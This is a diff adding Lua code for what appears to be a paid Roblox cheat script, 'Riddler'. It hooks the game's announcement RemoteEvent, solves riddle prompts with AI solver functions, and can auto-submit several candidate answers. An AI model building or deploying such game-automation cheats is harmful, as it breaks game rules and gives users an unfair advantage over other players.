+local function onAnnouncement(...)
+    if not state.enabled or not state.listening then return end
+    local text = stripRich(tostring((...) or ""))
+    text = trim(text)
+    if text == "" or solving then return end
+    if state.ignoreSystem and #text < 3 then return end
+
+    QText.Text = text
+    QText.TextColor3 = C.txt
+
+    local ts = os.date("%H:%M:%S")
+    local hitLine = '<font color="' .. RICH.Dim .. '">[' .. ts .. ']</font> '
+        .. '<font color="' .. RICH.Amber .. '">Q:</font> '
+        .. '<font color="' .. RICH.White .. '">' .. text:sub(1, 80) .. '</font>'
+    feedAppend(hitLine)
+    feedAppend('<font color="' .. RICH.Dim .. '">   ⟳ thinking…</font>')
+
+    solving = true
+    task.spawn(function()
+        local answers
+        if state.secureAnswer then
+            -- multi-answer path: returns an array of candidate answers
+            answers = solveRiddleMulti(text, function(msg)
+                feedReplaceLast('<font color="' .. RICH.Dim .. '">   ⟳ ' .. tostring(msg) .. '</font>')
+            end)
+        else
+            -- single-answer path
+            local single = solveRiddle(text, function(msg)
+                feedReplaceLast('<font color="' .. RICH.Dim .. '">   ⟳ ' .. tostring(msg) .. '</font>')
+            end)
+            if single then answers = { single } end
+        end
+
+        if answers and #answers > 0 then
+            local primary = answers[1]
+            AnswerInput.Text = primary
+            if state.autoCopy then setClipboardSafe(primary) end
+
+            local feedAns = primary
+            if #answers > 1 then
+                feedAns = feedAns .. "  (+" .. (#answers - 1) .. " alt)"
+            end
+            feedReplaceLast('<font color="' .. RICH.Purp .. '">   → </font>'
+                .. '<font color="' .. RICH.Green .. '">' .. feedAns .. '</font>')
+
+            if activeSolveLog and activeSolveLog.add then
+                activeSolveLog.add(text, table.concat(answers, ", "))
+            end
+
+            if state.autoRedeem then
+                for i, ans in ipairs(answers) do
+                    local _, msg = submitAnswer(ans)
+                    if msg then
+                        local prefix = (#answers > 1) and ("(" .. i .. "/" .. #answers .. ") ") or ""
+                        feedAppend('<font color="' .. RICH.Dim .. '">   ' .. prefix .. tostring(msg) .. '</font>')
+                    end
+                    if i < #answers then task.wait(0.7) end
+                end
+            end
+            solvedCount = solvedCount + 1
+            SolveLbl.Text = solvedCount .. " solved"
+            if state.openFeedOnHit and FeedPage.Visible == false then
+                setActiveTab("Feed")
+            end
+        else
+            feedReplaceLast('<font color="' .. RICH.Red .. '">   ✗ no answer</font>')
+        end
+        solving = false
+    end)
+end
+onAnnouncementRef = onAnnouncement
+
+task.spawn(function()
+    local r = tryResolve()
+    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
+        listenConn = r.OnClientEvent:Connect(function(...)
+            if looksLikeAnnouncement(...) then
+                local raw = stripRich(tostring((...) or ""))
+                local lower = raw:lower()
+                if lower:find("riddle", 1, true) then
+                    if not state.enabled and aiSet then aiSet(true) end
+                    if not state.listening and listenSet then listenSet(true) end
+                end
+                pcall(onAnnouncement, ...)
+            end
+        end)
+        StatusDot.BackgroundColor3 = C.ok
+        HeaderStatus.Text = "ready - notify mapped"
+        HeaderStatus.TextColor3 = C.ok
+        ReadyText.Text = "ready - notify mapped"
+        ReadyText.TextColor3 = C.ok
+        ReadyDot.BackgroundColor3 = C.ok
+    else
+        StatusDot.BackgroundColor3 = C.err
+        HeaderStatus.Text = "notify missing"
+        HeaderStatus.TextColor3 = C.err
+        ReadyText.Text = "notify remote not found"
+        ReadyText.TextColor3 = C.err
+        ReadyDot.BackgroundColor3 = C.err
+    end
+    feedAppend('<font color="' .. RICH.Dim .. '">[boot] riddler loaded. notify='
+        .. (notifyRemoteRef and "ok" or "missing") .. '</font>')
+end)
+
+-- ============================================================
+-- STOP
+-- ============================================================
+env.StopRiddler = function()
+    if listenConn then pcall(function() listenConn:Disconnect() end); listenConn = nil end
+    if SG then SG:Destroy() end
+    if headTag and headTag.billboard then pcall(function() headTag.billboard:Destroy() end) end
+end
+
+setActiveTab("Test")
+print("[RIDDLER] loaded — LUNA AI RIDDLER BUYER tag across the screen")
